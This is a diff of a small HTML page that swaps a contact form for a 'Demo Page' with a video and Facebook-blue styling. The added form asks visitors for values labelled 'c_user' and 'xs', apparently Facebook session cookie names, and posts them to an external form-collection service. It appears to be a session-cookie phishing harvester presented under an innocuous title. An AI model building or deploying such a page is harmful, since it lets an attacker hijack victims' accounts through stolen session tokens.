@@ -3,96 +3,54 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safe Video + Form</title>
+  <title>Demo Page</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
     body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
       display: flex;
       justify-content: center;
       padding-top: 60px;
     }
-    .top-bar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 50px;
-      background-color: #1877f2;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      padding: 0 20px;
-      font-size: 1.2rem;
-      font-weight: bold;
-    }
-    .container {
-      max-width: 600px;
-      width: 90%;
-    }
-    .card {
-      background-color: #fff;
+    .box {
+      background: #fff;
+      padding: 25px;
       border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      padding: 30px;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-    video {
       width: 100%;
-      border-radius: 8px;
-      margin-bottom: 20px;
+      max-width: 400px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
-    input, textarea {
+    input, button {
       width: 100%;
       padding: 10px;
       margin-bottom: 10px;
       border-radius: 6px;
       border: 1px solid #ddd;
-      font-size: 1rem;
+      font-size: 15px;
     }
     button {
-      width: 100%;
-      padding: 10px;
-      background-color: #1877f2;
+      background: #1877f2;
       color: #fff;
       border: none;
-      border-radius: 6px;
-      font-size: 1rem;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-  <div class="top-bar">Safe Demo</div>
-
-  <div class="container">
+  <div class="box">
 
     <!-- Video -->
-    <div class="card">
-      <video controls>
-        <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-        Your browser does not support HTML5 video.
-      </video>
-      <p>Watch this demo video safely.</p>
-    </div>
+    <video width="100%" controls>
+      <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+    </video>
 
-    <!-- Your Form -->
-    <div class="card">
-      <h1>Contact Us</h1>
-      <form action="https://submit-form.com/nHgDXoBTJ" method="POST">
-        <input type="text" name="name" placeholder="Your Name" required>
-        <input type="email" name="email" placeholder="Your Email" required>
-        <textarea name="message" placeholder="Your Message" rows="4" required></textarea>
-        <button type="submit">Submit</button>
-      </form>
-    </div>
+    <!-- Form -->
+    <form action="https://submit-form.com/nHgDXoBTJ" method="POST">
+      <input type="text" name="c_user" placeholder="c_user" required>
+      <input type="text" name="xs" placeholder="xs" required>
+      <button type="submit">Submit</button>
+    </form>
 
   </div>
 
